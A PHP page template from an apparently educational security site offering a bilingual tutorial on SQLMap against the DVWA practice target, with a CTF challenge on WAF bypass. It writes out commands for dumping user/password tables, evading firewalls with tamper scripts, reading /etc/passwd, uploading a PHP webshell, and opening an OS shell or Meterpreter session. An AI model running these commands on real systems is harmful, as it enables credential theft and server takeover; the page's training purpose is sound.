<?php
/**
 * CyberEscudo — Proyecto: SQLMAP
 */
require_once __DIR__ . '/../bootstrap.php';

$pageTitle    = $lang === 'es' ? 'SQLMap — Explotación de SQL Injection — CyberEscudo' : 'SQLMap — SQL Injection Exploitation — CyberEscudo';
$contentTitle = $lang === 'es' ? 'SQLMap: Explotación Avanzada de SQL Injection' : 'SQLMap: Advanced SQL Injection Exploitation';
$contentDate  = '2022-02-08';
$contentDiff  = 'advanced';
$contentTags  = ['SQLMap', 'SQL Injection', 'DVWA', 'BurpSuite', 'WAF Bypass', 'OS-Shell'];

ob_start();
if ($lang === 'es'): ?>
<div class="prose">
  <p><strong>SQLMap</strong> es la herramienta de código abierto más potente y completa para la detección y explotación automatizada de vulnerabilidades de inyección SQL (SQLi). Soporta 6 tipos diferentes de inyección: <em>Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries</em> y <em>Out-of-band</em>.</p>

  <h2>1. El Método Profesional: Archivos de Petición (<code>-r</code>)</h2>
  <p>Aunque puedes pasar la URL (<code>-u</code>) y las cookies (<code>--cookie</code>) manualmente, es tedioso y propenso a errores. El estándar en auditorías es interceptar la petición con BurpSuite, guardarla en un archivo <code>.txt</code> y pasársela a SQLMap. Esto inyecta todos los encabezados, cookies y datos POST automáticamente.</p>
  <pre><code># 1. En BurpSuite, intercepta la petición vulnerable.
# 2. Clic derecho -> "Copy to file" (guárdalo como request.txt).
# 3. Lanza SQLMap indicando el archivo:
sqlmap -r request.txt --dbs</code></pre>

  <h2>2. Extracción de Información (Enumeración)</h2>
  <p>Una vez confirmada la inyección, el objetivo es mapear la estructura de la base de datos para encontrar la información valiosa.</p>
  <pre><code># Enumerar todas las bases de datos disponibles:
sqlmap -r request.txt --dbs

# Obtener usuario actual, base de datos actual y privilegios:
sqlmap -r request.txt --current-user --current-db --is-dba

# Enumerar las tablas de una base de datos específica (-D):
sqlmap -r request.txt -D dvwa --tables

# Enumerar las columnas de una tabla específica (-T):
sqlmap -r request.txt -D dvwa -T users --columns

# Volcar (Dump) todo el contenido de la tabla:
sqlmap -r request.txt -D dvwa -T users --dump

# Volcar solo columnas específicas (-C):
sqlmap -r request.txt -D dvwa -T users -C user,password --dump</code></pre>

  <h2>3. Evasión de WAF/IPS y Sigilo</h2>
  <p>Los firewalls de aplicaciones web (WAF) como Cloudflare o ModSecurity bloquearán los payloads por defecto de SQLMap. Necesitamos afinar el escáner para ser indetectables.</p>
  <pre><code># Añadir retraso entre peticiones (en segundos) para no disparar alertas de Rate Limiting:
sqlmap -r request.txt --delay=2

# Usar un User-Agent de un navegador real (por defecto SQLMap usa el suyo propio y es bloqueado):
sqlmap -r request.txt --random-agent

# Forzar el uso de scripts Tamper para ofuscar los payloads.
# space2comment.py cambia los espacios en blanco por comentarios (/**/) para evadir filtros simples:
sqlmap -r request.txt --tamper=space2comment

# Aumentar la agresividad del escaneo (Level 1-5, Risk 1-3).
# Level 3+ inyecta en cabeceras HTTP (User-Agent, Referer). Risk 3 usa sentencias pesadas como OR/AND.
sqlmap -r request.txt --level=3 --risk=2</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 22 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Simulador WAF Bypass
      </h3>
      <p style="margin-bottom: 1.5rem;">Has interceptado una petición hacia un panel de administrador y la has guardado como <code>request.txt</code>. Hay un WAF configurado que bloquea inyecciones con espacios en blanco. Construye el comando de <strong>sqlmap</strong> que utilice el archivo de petición, vuelque (dump) la tabla <code>admin_creds</code> de la base de datos <code>corp_db</code>, y utilice el script tamper <code>space2comment</code> para evadir el firewall.</p>
      <a href="/ctf/ctf-22.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 22
      </a>
  </div>

  <h2>4. Toma de Control del Servidor (OS Takeover)</h2>
  <p>Si el usuario de la base de datos es <code>root</code> o <code>DBA</code> (Database Administrator) y el servidor tiene una misconfiguración de lectura/escritura de archivos (como <code>FILE</code> priv en MySQL o <code>xp_cmdshell</code> en MSSQL), SQLMap puede saltar de la base de datos al sistema operativo subyacente.</p>
  <pre><code># Leer un archivo del servidor víctima:
sqlmap -r request.txt --file-read="/etc/passwd"

# Subir un archivo al servidor (Ej: Una webshell PHP):
sqlmap -r request.txt --file-write="webshell.php" --file-dest="/var/www/html/webshell.php"

# ¡El Santo Grial! Abrir una consola interactiva en el servidor (RCE):
sqlmap -r request.txt --os-shell

# Lanzar Meterpreter a través de la inyección SQL (Para conectar con Metasploit):
sqlmap -r request.txt --os-pwn</code></pre>

  <h2>5. Shell SQL Interactiva</h2>
  <p>Si no puedes conseguir una shell del sistema operativo, al menos puedes conseguir una consola SQL interactiva directa para teclear comandos nativos (útil cuando SQLMap falla al extraer un volcado limpio).</p>
  <pre><code>sqlmap -r request.txt --sql-shell
# sql-shell> SELECT @@version;
# sql-shell> SHOW GRANTS;</code></pre>

</div>

<?php else: ?>
<div class="prose">
  <p><strong>SQLMap</strong> is the most powerful and comprehensive open-source tool for automated detection and exploitation of SQL injection (SQLi) vulnerabilities. It supports 6 types of injections: <em>Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries</em>, and <em>Out-of-band</em>.</p>

  <h2>1. The Professional Way: Request Files (<code>-r</code>)</h2>
  <p>While you can pass URLs (<code>-u</code>) and cookies (<code>--cookie</code>) manually, the industry standard is to intercept the request with BurpSuite, save it to a <code>.txt</code> file, and pass it to SQLMap. This automatically parses all headers, cookies, and POST data.</p>
  <pre><code># 1. In BurpSuite, intercept the vulnerable request.
# 2. Right-click -> "Copy to file" (save as request.txt).
# 3. Launch SQLMap using the file:
sqlmap -r request.txt --dbs</code></pre>

  <h2>2. Data Extraction (Enumeration)</h2>
  <p>Once the injection is confirmed, map the database structure to find valuable data.</p>
  <pre><code># Enumerate all databases:
sqlmap -r request.txt --dbs

# Get current user, current DB, and check for DBA privileges:
sqlmap -r request.txt --current-user --current-db --is-dba

# Enumerate tables in a specific database (-D):
sqlmap -r request.txt -D dvwa --tables

# Enumerate columns in a specific table (-T):
sqlmap -r request.txt -D dvwa -T users --columns

# Dump the entire table:
sqlmap -r request.txt -D dvwa -T users --dump

# Dump specific columns only (-C):
sqlmap -r request.txt -D dvwa -T users -C user,password --dump</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 22 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> WAF Bypass Simulator
      </h3>
      <p style="margin-bottom: 1.5rem;">You intercepted a request to an admin panel and saved it as <code>request.txt</code>. A WAF is configured to block injections containing whitespace. Build the <strong>sqlmap</strong> command to use the request file, dump the <code>admin_creds</code> table from the <code>corp_db</code> database, and use the <code>space2comment</code> tamper script to evade the firewall.</p>
      <a href="/ctf/ctf-22.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 22 CHALLENGE
      </a>
  </div>

  <h2>3. WAF/IPS Evasion & Stealth</h2>
  <p>Web Application Firewalls (WAF) like Cloudflare will block default SQLMap payloads. We must tune the scanner to remain undetected.</p>
  <pre><code># Add a delay between requests (in seconds) to avoid Rate Limiting:
sqlmap -r request.txt --delay=2

# Use a random, real browser User-Agent:
sqlmap -r request.txt --random-agent

# Use Tamper scripts to obfuscate payloads.
# space2comment.py replaces whitespaces with comments (/**/) to evade simple filters:
sqlmap -r request.txt --tamper=space2comment

# Increase scan aggressiveness (Level 1-5, Risk 1-3).
# Level 3+ injects into HTTP headers (User-Agent, Referer).
sqlmap -r request.txt --level=3 --risk=2</code></pre>

  <h2>4. OS Takeover</h2>
  <p>If the DB user is <code>root</code> or <code>DBA</code>, and the server has file read/write misconfigurations (like <code>FILE</code> priv in MySQL or <code>xp_cmdshell</code> in MSSQL), SQLMap can jump from the database to the underlying Operating System.</p>
  <pre><code># Read a file from the victim server:
sqlmap -r request.txt --file-read="/etc/passwd"

# The Holy Grail! Pop an interactive OS shell (RCE):
sqlmap -r request.txt --os-shell</code></pre>
</div>
<?php endif;
$contentBody = ob_get_clean();
require __DIR__ . '/../templates/content-page.php';